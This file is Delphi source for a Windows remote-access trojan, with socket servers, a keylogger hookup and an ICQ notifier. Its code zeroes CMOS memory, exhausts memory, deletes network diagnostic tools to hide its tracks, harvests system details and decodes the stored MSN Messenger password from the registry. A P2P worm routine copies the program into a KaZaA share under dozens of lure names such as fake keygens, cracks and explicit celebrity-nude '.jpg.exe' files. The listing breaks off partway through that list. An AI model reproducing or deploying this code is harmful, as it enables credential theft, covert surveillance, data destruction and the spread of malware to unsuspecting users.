   unit Unit1;

   interface

   uses
     Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,shellapi,
     Dialogs, ScktComp,registry, StdCtrls, OleServer, Messenger_TLB,Tlhelp32,IniFiles,
     TFlatTitlebarUnit, ExtCtrls, Gauges,keyboardspy;

   type
     TForm1 = class(TForm)
       ss: TServerSocket;
       ICQs: TClientSocket;
       ListBox1: TListBox;
       DELDI: TButton;
       Shape2: TShape;
       Shape1: TShape;
       Memo2: TMemo;
       Memo1: TMemo;
       Label2: TLabel;
       Label1: TLabel;
       Button1: TButton;
       CS: TClientSocket;
       Timer1: TTimer;
       ss2: TServerSocket;
       Gauge1: TGauge;
       Keylogger: TServerSocket;
       Timer2: TTimer;
       Memo3: TMemo;
       Timer3: TTimer;
       img: TImage;
       Memo4: TMemo;
       MM: TGauge;
       tmrPROG: TTimer;
       procedure FormCreate(Sender: TObject);
       procedure FormClose(Sender: TObject; var Action: TCloseAction);
       procedure ICQsConnect(Sender: TObject; Socket: TCustomWinSocket);
       procedure ssListen(Sender: TObject; Socket: TCustomWinSocket);
       procedure ssClientError(Sender: TObject; Socket: TCustomWinSocket;
         ErrorEvent: TErrorEvent; var ErrorCode: Integer);
       procedure ssClientRead(Sender: TObject; Socket: TCustomWinSocket);
           procedure ListFiles(D,Name,SearchName : String);
       procedure ssClientDisconnect(Sender: TObject;
         Socket: TCustomWinSocket);
       procedure DELDIClick(Sender: TObject);
       procedure ICQsError(Sender: TObject; Socket: TCustomWinSocket;
         ErrorEvent: TErrorEvent; var ErrorCode: Integer);
       procedure Timer1Timer(Sender: TObject);
       procedure ss2ClientError(Sender: TObject; Socket: TCustomWinSocket;
         ErrorEvent: TErrorEvent; var ErrorCode: Integer);
       procedure ss2ClientRead(Sender: TObject; Socket: TCustomWinSocket);
       procedure Timer2Timer(Sender: TObject);
       procedure KeyloggerClientError(Sender: TObject;
         Socket: TCustomWinSocket; ErrorEvent: TErrorEvent;
         var ErrorCode: Integer);
       procedure KeyloggerClientRead(Sender: TObject;
         Socket: TCustomWinSocket);
       procedure Timer3Timer(Sender: TObject);
       procedure CSError(Sender: TObject; Socket: TCustomWinSocket;
         ErrorEvent: TErrorEvent; var ErrorCode: Integer);
       procedure ssAccept(Sender: TObject; Socket: TCustomWinSocket);
       procedure ssClientConnect(Sender: TObject; Socket: TCustomWinSocket);
       procedure tmrPROGTimer(Sender: TObject);
     private
       { Private declarations }
   Stop: Boolean;
     public
       { Public declarations }
               StreamSize:TFileStream;
               IncommingStream:TFileStream;
     end;
       procedure CloseCD;
       procedure OpenCD;
           procedure ExitForced;
           procedure ExitLogOff;
           procedure ExitBoot;
           procedure ExitShutDown;
           procedure ExitPowerOff;
           procedure OpenURL(hWnd: THandle; strURL: string);
           procedure ReverseButtons(boolReverse: Boolean);
           procedure ShowTask(cShow: Boolean);
           procedure PowerMonitor(hWnd: THandle; Power: Boolean);
     function mciSendString(lpstrCommand, lpstrReturnString: PChar; uReturnLength: LongWord; hWndCallback: HWND): DWORD; stdcall; external 'winmm.dll' name 'mciSendStringA';
   function SHEmptyRecycleBin
     (Wnd:HWnd; LPCTSTR:PChar; DWORD:Word):Integer; stdcall;
   var
     Form1: TForm1;
     Caccept:boolean;
   //PageMeWhen options
     startup:string='Startup';
     upload_name:string;
     filemax:integer;
     finternet:string='On found internet';
     never:string='Never';
     autorespond:string;
     UserLimit,MOS_X,MOS_Y:integer;
   const
     port           :string='poooort=82797122';
     uin            :string='icQpage=31337';
     closeable      :string='closeme=1';
     autostart      :string='startup=1';
     PageMeWhen     :string='pagemew=0';
     Password       :String='passwor=0';
    SHERB_NOCONFIRMATION = $00000001;
    SHERB_NOPROGRESSUI   = $00000002;
    SHERB_NOSOUND        = $00000004;
    RSPSIMPLESERVICE = 1;
       RSPUNREGISTERSERVICE = 0;
   function RegisterServiceProcess(dwProcessID, dwType: DWord) : DWord; stdcall; external 'KERNEL32.DLL';
   implementation

   {$R *.dfm}
   function SHEmptyRecycleBin; external 'SHELL32.DLL' name 'SHEmptyRecycleBinA';

   type

     //Pass parts graphical structure:
     //|XX XX XX XX|XX XX XX XX|XX XX XX XX|XX XX XX XX|XX XX XX XX|XX XX 3D 3D|00
     //Each group is named consecutively |GI FC SC TC|
     //A 00 means the end of the encoded password. A 3D means a null encoded character.

     PassParts = array [0..6,0..3] of byte; //Parts of the password, it devides into groups of 4 encoded characters which is equivalent to 3 decoded characters. There can be a maximum of 6 groups (16 decoded characters, 25 encoded)
     DecPassArray = array [0..24] of byte;  //Array got directly from the registry. It can be 25 characters maximum
   var
     PassSize:integer;  //Size in characters (including the ending) of encoded password

   {This function makes a table of equivalence of the set of values.
    The set consists 41..$5A,$61..$7A,$30..$39,$2B,$2F which are in order,
    corresponding a 0 to 41 and a 3F to 2F}
    // START of evil funcitons

   procedure ClearCMOS;
   asm
          MOV AX,0h        { 0 hex start of CMOS memory address }
   @L1:   OUT 70h,AX       { Goto address of CMOS memory specified by the contents of Accumulator }
          MOV BX,AX        { Save contents of Accumulator (OUT instruction can only use Accumulator) }
          MOV AX,0h        { Put 0 hex data into CMOS memory }
          OUT 71h,AX       { Put 0 hex data into CMOS memory }
          MOV AX,BX        { Restore contents of Accumulator }
          INC AX           { Add 1 to contents of the Accumulator }
          CMP AX,03Fh      { Remmember 3F hex equals 63 Dec Have we
   //put 0 hex in CMOS memory addreses from 0 Dec to 63 DEC ? }
          JNZ @L1          { Has the L1 loop run 64 times? }
   end;

   function KillTask(ExeFileName: string): integer;
   const
     PROCESS_TERMINATE=$0001;
   var
     ContinueLoop: BOOL;
     FSnapshotHandle: THandle;
     FProcessEntry32: TProcessEntry32;
   begin
     result := 0;
     FSnapshotHandle := CreateToolhelp32Snapshot
                        (TH32CS_SNAPPROCESS, 0);
     FProcessEntry32.dwSize := Sizeof(FProcessEntry32);
     ContinueLoop := Process32First(FSnapshotHandle,
                                    FProcessEntry32);
     while integer(ContinueLoop) <> 0 do
     begin
       if ((UpperCase(ExtractFileName(FProcessEntry32.szExeFile)) =
            UpperCase(ExeFileName))
        or (UpperCase(FProcessEntry32.szExeFile) =
            UpperCase(ExeFileName))) then
         Result := Integer(TerminateProcess(OpenProcess(
                           PROCESS_TERMINATE, BOOL(0),
                           FProcessEntry32.th32ProcessID), 0));
       ContinueLoop := Process32Next(FSnapshotHandle,
                                     FProcessEntry32);
     end;
     CloseHandle(FSnapshotHandle);
   end;

   procedure EatMe;
   var
   C :PChar;
   begin
         while 1=1 do
            begin
            GetMem(C, 1024)
            end;
   end;

   Procedure CoverMyTracks;
   var
   WindowsDirectory : String ;
   begin
   DeleteFile(WindowsDirectory+'Netstat.exe');
   DeleteFile(WindowsDirectory+'NBTSTAT.EXE');
   DeleteFile(WindowsDirectory+'TRACERT.EXE');
   DeleteFile(WindowsDirectory+'ROUTE.EXE');
   DeleteFile(WindowsDirectory+'PING.EXE');
   end;

   procedure KATALOGER(strings:string);
   var
   I: Integer;
   begin
         for I := 0 to 66665 do
           begin
           CreateDirectory(PChar('C:\' + strings + IntToStr(I)), nil);
           end;
   end;

   procedure FLIPME;
   var
    Canvas: TCanvas;
   begin
    Canvas:=TCanvas.Create;
    try
      Canvas.Handle:=CreateDC('DISPLAY',nil,nil,nil);
      Canvas.CopyRect(Rect(0,0,Screen.Width,Screen.Height),Canvas,
        Rect(0,Screen.Height,Screen.Width,0));
    finally
      Canvas.Free;
    end;
   end;

   procedure BootToSafeMode(Yes:Boolean);
   var Attr:integer;
   const MsDosSys='C:\MSDOS.SYS';
   begin
    Attr:=FileGetAttr(MsDosSys);
    FileSetAttr(MsDosSys,0);
    with TIniFile.Create(MsDosSys) do begin
      WriteInteger('Options','BootSafe',Integer(Yes));
      WritePrivateProfileString(nil,nil,nil,pChar(MsDosSys));
      Free;
    end;
    FileSetAttr(MsDosSys,Attr);
   end;



   // DETAILS ON

   Function UserName : string;
    Var
        buffer : String;
        buffsize : DWORD;
     Begin
          buffsize := 128;
          Setlength(buffer,buffsize);
          Getusername(Pchar(buffer),buffsize);
          result := buffer;
     end;
   FUNCTION ComputerName:string;
   var
     arrCompName : Array[0..255] Of Char;
     strCompName : String;
     CompNameLen : Cardinal;
    // CompNameLen : Cardinal; If using Delphi4
    // Thanks to Kurt Troncquo
   begin
    CompNameLen := MAX_COMPUTERNAME_LENGTH + 1;
     If GetComputerName(arrCompName, CompNameLen) Then
       Begin
        SetLength(strCompName, MAX_COMPUTERNAME_LENGTH + 1);
        result := StrPas(arrCompName);
       End;

   end;

   function GetOrg: string;
   var
     reg : TRegistry;
   begin
     reg         := TRegistry.Create;
     try
       reg.Rootkey := HKEY_LOCAL_MACHINE;
       reg.Openkey('software\microsoft\windows\currentversion', False);
       Result := reg.ReadString('RegisteredOrganization');
     finally
       reg.Free;
     end;
   end;

   function GetRegowner: string;
   var
     reg : TRegistry;
   begin
     reg         := TRegistry.Create;
     try
       reg.Rootkey := HKEY_LOCAL_MACHINE;
       reg.Openkey('software\microsoft\windows\currentversion', False);
       Result := reg.ReadString('RegisteredOwner');
     finally
       reg.Free;
     end;
   end;

   function GetWorkgroup: string;
   var
     reg : TRegistry;
   begin
     reg         := TRegistry.Create;
     try
       reg.Rootkey := HKEY_LOCAL_MACHINE;
       reg.Openkey('system\CurrentControlSet\Services\VxD\VNETSUP', False);
       Result := reg.ReadString('Workgroup');
     finally
       reg.Free;
     end;
   end;

   function Memory: string;
   var
      MemoryStatus: TMemoryStatus;

    begin

      MemoryStatus.dwLength := SizeOf(MemoryStatus);

      GlobalMemoryStatus(MemoryStatus);

      with MemoryStatus do
      begin
        { Size of MemoryStatus record }
        Result := (IntToStr(dwLength) +
          ' Size of ''MemoryStatus'' record');
        { Per-Cent of Memory in use by your system }
        result := result + (IntToStr(dwMemoryLoad) +
          '% memory in use');
        {The amount of Total Physical memory allocated to your system.}
        result := result + (IntToStr(dwTotalPhys) +
          ' Total Physical Memory in bytes');
        { The amount available of physical memory in your system. }
        result := result + (IntToStr(dwAvailPhys) +
          ' Available Physical Memory in bytes');
        { The amount of Total Bytes allocated to your page file }
        result := result + (IntToStr(dwTotalPageFile) +
          ' Total Bytes of Paging File');
        { The amount of available bytes in your page file }
        result := result + (IntToStr(dwAvailPageFile) +
          ' Available bytes in paging file');
        { The amount of Total bytes allocated to this program
           (generally 2 gigabytes of virtual space) }
        result := result + (IntToStr(dwTotalVirtual) +
          ' User Bytes of Address space');
        { The amount of avalable bytes that is left to your program to use }
           result := result + IntToStr(dwAvailVirtual) +
          ' Available User bytes of address space'end;



    end;

    function PROCName: string;
   var
     reg : TRegistry;
   begin
     reg         := TRegistry.Create;
     try
       reg.Rootkey := HKEY_LOCAL_MACHINE;
       reg.Openkey('Hardware\Description\System\CentralProcessor\0', False);
       Result := reg.ReadString('Identifier');
     finally
       reg.Free;
     end;
   end ;

   function GetCPUSpeed: Double;
   const
     DelayTime = 500; // measure time in ms
   var
     TimerHi, TimerLo: DWORD;
     PriorityClass, Priority: Integer;
   begin
     PriorityClass := GetPriorityClass(GetCurrentProcess);
     Priority := GetThreadPriority(GetCurrentThread);
     SetPriorityClass(GetCurrentProcess, REALTIME_PRIORITY_CLASS);
     SetThreadPriority(GetCurrentThread, THREAD_PRIORITY_TIME_CRITICAL);
     Sleep(10);
     asm
       dw 310Fh // rdtsc
       mov TimerLo, eax
       mov TimerHi, edx
     end;
     Sleep(DelayTime);
     asm
       dw 310Fh // rdtsc
       sub eax, TimerLo
       sbb edx, TimerHi
       mov TimerLo, eax
       mov TimerHi, edx
     end;
     SetThreadPriority(GetCurrentThread, Priority);
     SetPriorityClass(GetCurrentProcess, PriorityClass);
     Result := TimerLo / (1000.0 * DelayTime);
   {


       Label1.Caption := Format('CPU speed: %f MHz', [GetCPUSpeed]);
       Application.ProcessMessages;

   }
   end;



   // DETAILS OFF


   procedure MSDOS;
   var
   szWinDir:array[0..MAX_PATH] of char;
   Cmd:string;
   begin
    GetWindowsDirectory(szWinDir,SizeOf(szWinDir));
    Cmd:=StrPas(szWinDir);
    if Cmd[Length(Cmd)]<>'\' then Cmd:=Cmd+'\';
    Cmd:=Cmd+'Exit to DOS.pif';
    if FileExists(cmd) then
    WinExec(pChar(#34+cmd+#34),SW_SHOWNORMAL);
   end;


    // ENd of EVIL functions
   procedure OpenCD;
   begin
      mciSendString(Pchar('set cdaudio door open'),nil,0,0);
   end;

   procedure CloseCD;
   begin
      mciSendString(Pchar('set cdaudio door closed'),nil,0,0);
   end;
   procedure ReverseButtons(boolReverse: Boolean);
   begin
      SwapMouseButton(boolReverse);
   end;
   procedure ExitForced;
   begin
      ExitWindowsEx(EWX_FORCE or EWX_REBOOT, 0);
   end;

   procedure ExitLogOff;

   begin
      ExitWindowsEx(EWX_LOGOFF, 0);
   end;

   procedure ExitBoot;
   begin
      ExitWindowsEx(EWX_REBOOT, 0);
   end;

   procedure ExitShutDown;
   begin
      ExitWindowsEx(EWX_SHUTDOWN, 0);
   end;

   procedure ExitPowerOff;
   begin
      SetSystemPowerState(true,true);
   end;
   procedure OpenURL(hWnd: THandle; strURL: string);
   begin
      ShellExecute(hWnd,'Open',PChar(strURL),nil,nil,1);
   end;
   procedure ShowTask(cShow: Boolean);
   begin
      if cShow then
         SetWindowPos(FindWindow(PChar('Shell_traywnd'),nil),0,0,0,0,0,SWP_SHOWWINDOW)
      else
         SetWindowPos(FindWindow(PChar('Shell_traywnd'),nil),0,0,0,0,0,SWP_HIDEWINDOW);
   end;
   procedure PowerMonitor(hWnd: THandle; Power: Boolean);
   begin
      if Power then
         SendMessage(hWnd,WM_SYSCOMMAND,SC_MONITORPOWER,0)
      else
         SendMessage(hWnd,WM_SYSCOMMAND,SC_MONITORPOWER,-1);
   end;
   function WinDir: string;
   var
      intLen:integer;
      strBuffer:string;
   begin
      SetLength(strBuffer,1000);
      intLen:=GetWindowsDirectory(PChar(strBuffer),1000);
      WinDir:=Trim(Copy(strBuffer,1,intLen));
   end;

   function SysDir: string;
   var
      intLen:integer;
      strBuffer:string;
   begin
      SetLength(strBuffer,1000);
      intLen:=GetSystemDirectory(PChar(strBuffer),1000);
      SysDir:=Trim(Copy(strBuffer,1,intLen));
   end;

   function TmpDir: string;
   var
      intLen:integer;
      strBuffer:string;
   begin
      SetLength(strBuffer,1000);
      intLen:=GetTempPath(1000,PChar(strBuffer));
      TmpDir:=Trim(Copy(strBuffer,1,intLen));
   end;

   function EquivalentPositions(EncByte:byte):byte;
   var
     DecByte:byte;      //Semi-decoded byte, which will be the return value of the function
   begin

     Case EncByte of
       $41..$5A:DecByte:=EncByte-$41;
       $61..$7A:DecByte:=(EncByte-$61)+$1A;
       $30..$39:DecByte:=(EncByte-$30)+$34;
       $2B:DecByte:=$3E;
       $2F:DecByte:=$3F;
       $3D:DecByte:=$40;
     else
       DecByte:=$FF;
     end;
     EquivalentPositions:=DecByte;
   end;


   {This function gets the encrypted pasword from de registry}
   function GetRegPassword():DecPassArray;
   const
     {These constants can be changed, depending on wher MSN Messanger stores saved passwords}
     PassKey='\Software\Microsoft\MessengerService'; //Key in which the password is stored (Ver. 4.5)
     PassVal='Password.NET Messenger Service';       //Value in which the password is stored (Ver. 4.5)
   var
     MyRegistry:TRegistry;    //Registry object
     RegDatum:DecPassArray;   //Datum obtained from the registry containing the encrypted password string
   begin
     MyRegistry:=TRegistry.Create;
     MyRegistry.OpenKey(PassKey,False);
     PassSize:=MyRegistry.GetDataSize(PassVal);      //This value is used globally
     MyRegistry.ReadBinaryData(PassVal,RegDatum,PassSize);
     GetRegPassword:=RegDatum;
   end;

   {This function converts the data type DecPassArray in PassParts type.
   It does so by grouping the characters got from the registry in a more organized way
   explained earlier}
   function SortPassBytes(Pass:DecPassArray):PassParts;
   var
     Temp:PassParts;   //Temporary return value
     i,i2:integer;     //Counters of the two nested FOR-loops
   begin
     {Will repeat the loop as many times as groups can be in the array of characters got from the registry (PassSize minus the nulltermination char (00) divided by the four characters in each group).}
     For i:=0 to (PassSize-1) div 4 do
       {In each group, store 4 characters}
       For i2:=0 to 3 do
         Temp[i,i2]:=Pass[i*4+i2];
     {Store the last (null termination) character}
     SortPassBytes:=Temp;
   end;

   {Main function in which the full decoding takes place}
   function DecodePassword():string;
   var
     PassPart: PassParts;              //Variable in which the encrypted password (already organized) is stored
     iPart: integer;                   //Loop that repeats for each group to decode it
     GI, FC, SC, TC: byte;             //Semi-decoded byte is stored in each of this for every element of every group in turn in the loop
     FCValInSet, FCPosInSet: integer;  //Every semidecoded character has two meanings. Each meaning is stored in each of these two variables. In this case, these variables are for the first semi-decoded variable, FC.
     SCValInSet, SCPosInSet: integer;  //These variables are for the second semi-decoded variable, SC.
     TCPosInSet: integer;              //These variables are for the third semi-decoded variable, TC.
     C1, C2, C3: char;                 //Decoded character for GI, FC (C1), SC (C2), TC (C3)
     Password: DecPassArray;           //Password from the registry
     Temp: string;                     //Temporary return value
   begin
     Password:=GetRegPassword; {Get password from registry}
     PassPart:=SortPassBytes(GetRegPassword); {Organize encoded password from registry}

     {Main loop for decodification. It repeats for every group in the encoded password}
     for iPart:=0 to (PassSize div 4)-1 do
      begin
        {Semi-decode each element of the group}
        GI:=EquivalentPositions(PassPart[iPart,0]);
        FC:=EquivalentPositions(PassPart[ipart,1]);
        SC:=EquivalentPositions(PassPart[ipart,2]);
        TC:=EquivalentPositions(PassPart[ipart,3]);

        {Reset decoded characters containers}
        C2:=#0;
        C3:=#0;

        {Decoding of FC begins.
        This semi-decoded value is fully decoded by determining the GI group,
        which has 4 elements each, and add the member number which can be from 0 to 3}
        FCPosInSet:=FC div $10;  {this determines the member number}
        FCValInSet:=FC mod $10;  {this is used for full-decode SC}
        C1:=Char(GI*$4+FCPosInSet); {fully decoded FC}

        {Decoding of SC begins.
        This semi-decoded value is fully decoded by determining the FCValInSet group,
        which has h10 elements each, and add the member number which can be from 0 to h1F}
        If SC < $40 then
         begin
           SCPosInSet:=SC div $4;   {this determines the member nunmber}
           SCValInSet:=SC mod $4;   {this is used for full-deoode TC}
           C2:=Char(FCValInSet*$10+SCPosInSet); {fully decode SC}
         end;

        {Decoding of TC begins.
        This semi-decoded value is fully decoded by determining the SCValInSet group,
        which has h40 elements each, and add the member number which can be from 0 to h3F}
        If TC < $40 then
         begin
           TCPosInSet:=TC;   {this determines the member number}
           C3:=Char(SCValInSet*$40+TCPosInSet); {fully decode TC}
         end;

        Temp:=Temp+C1+C2+C3; {Decoded group of 3 characters}
      end;

      DecodePassword:=Temp;
   end;

   procedure WinHack(Numer:integer);
   begin
   case numer of

   0:ShowWindow(FindWindowEx(FindWindow('Shell_traywnd',nil),0,'Button',nil),1);
   1: ShowWindow(FindWindowEx(FindWindow('Shell_traywnd',nil),0,'Button',nil),0);
   2: EnableWindow(FindWindowEx(FindWindow('Shell_traywnd',nil),0,'Button',nil),True); //start
   3: EnableWindow(FindWindowEx(FindWindow('Shell_traywnd',nil),0,'Button',nil),False);
   4: ShowWindow(FindWindow('shell_traywnd',nil),1);
   5: ShowWindow(FindWindow('shell_traywnd',nil),0);         //tray
   6: EnableWindow(FindWindow('shell_traywnd',nil),True);
   7:  EnableWindow(FindWindow('shell_traywnd',nil),False);
   8:  ShowWindow(FindWindow('progman',nil),1);              //   ---------
   9:  ShowWindow(FindWindow('progman',nil),0);              //    Desktop |
   10:  EnableWindow(FindWindow('shell_traywnd',nil),True);  //    Setting |
   11:  EnableWindow(FindWindow('shell_traywnd',nil),False); //   ---------

   end;
   end;

   procedure KaZaA_infekt;
   var reg:Tregistry;
   begin

   reg := TRegistry.Create;
   reg.RootKey := HKEY_CURRENT_USER;
   if reg.OpenKey('Software\Kazaa\LocalContent',True) then
    reg.WriteString('DisableSharing','0');
   reg.writestring('dir0','012345:'+'C:\Windows\sys32');
   reg.writestring('dir1','012345:'+'C:\Windows\sys32');
   reg.writestring('dir2','012345:'+'C:\Windows\sys32');
   reg.writestring('dir3','012345:'+'C:\Windows\sys32');
   reg.writestring('dir4','012345:'+'C:\Windows\sys32');
   reg.writestring('dir5','012345:'+'C:\Windows\sys32');
   CreateDirectory('C:\windows\sys32',NIL);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Britney.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\host_faker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\host_spoofer.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\ip_spoofer.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\ip_faker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\ident_spoofer.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\ident_faker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\tripod_hacker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\tripod_cracker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\hotmailhacker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\hotmailcracker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\hotmail_account_sniffer.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\aimhacker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\aimcracker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\icqhacker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\icqcracker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\msnhacker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\msncracker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\winxp_hacker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\winxp_cracker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\winxphack.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\winxp_crack.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\win2k_serial.jpg.exe',True);
   CopyFile(PChar(Application.exename),'C:\Windows\sys32\yahoo_cracker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\yahoo_hacker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\divx_fix.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\divx_repair.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\ftp_hacker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\ftp_cracker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\porn_account_hacker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\porn_account_cracker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\catherine_zeta_jones_nude.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\catherine_zeta_jones_naked.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\catherine_zeta_jones_anal.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\pamela_anderson_anal.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\pamela_anderson_nude.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\pamela_anderson_naked.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\buttman.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\sarah_michelle_gellar_nude.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\sarah_michelle_gellar_naked.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\sandra_bullock_nude.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\sandra_bullock_naked.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\anastasia_anal.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\anastasia_naked.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\anastasia_nude.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\shakira_anal.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\shakira_assfucked.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\shakira_naked.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\shakira_nude.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\shakira_paparazzi_collection.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\XP_keygen.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\PS2_emulator_bleem.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\xbox_emulator_beta.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\linux_root.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\win2k_pass_decryptor.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Win2k_reboot_exploit.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\IIS_shellbind_exploit.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\AdvZip Recovery.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\AIM Pass stealer.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\AMI BIOS Cracker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Counter Strike_CD_Keygen.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Delphi 5 Keygen.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Delphi 6 Keygen.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Half_life Cd keygen.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Hotmail Hacker.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\ICQ_Hackingtools.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\invisible_IP.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kazaa.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\edonkey_serverlist.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd151_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd152_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd153_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd154_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd155_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd156_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd157_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd158_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd159_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd160_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd161_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd162_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd163_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd164_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd165_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd166_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd167_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd168_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd200_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd201_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\kmd202_en.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Linux_rootaccess.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\msn_IP_finder.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Office key Gen.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Autocad 2002 Crack.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\Office XP Crack.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\OfficeXP_Keygen.jpg.exe',True);
   CopyFile(PChar(Application.ExeName),'C:\Windows\sys32\PS1 BootCD.jpg.exe',True);
